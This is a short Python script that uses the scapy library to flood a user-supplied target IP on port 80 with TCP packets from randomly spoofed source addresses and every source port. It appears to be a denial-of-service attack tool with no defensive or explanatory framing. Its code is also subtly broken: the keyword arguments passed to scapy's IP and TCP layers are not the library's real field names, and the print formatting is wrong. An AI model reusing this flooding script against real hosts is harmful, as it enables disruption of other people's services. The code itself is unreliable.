#!/usr/bin/env python3

import random
from scapy.all import *

targetIP = input("Enter target IP address: ")
i = 1

while True:
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = "."
    sourceIP = a + dot + b + dot + c + dot + d

    for sourcePort in range(1, 65535):
        IP1 = IP(sourceIP=sourceIP, destination=targetIP)
        TCP1 = TCP(srcPort=sourcePort, dstport=80)
        pkt = IP1/TCP1
        send(pkt, inter=.001)

        print("packet %s sent", i)
        i = i + 1
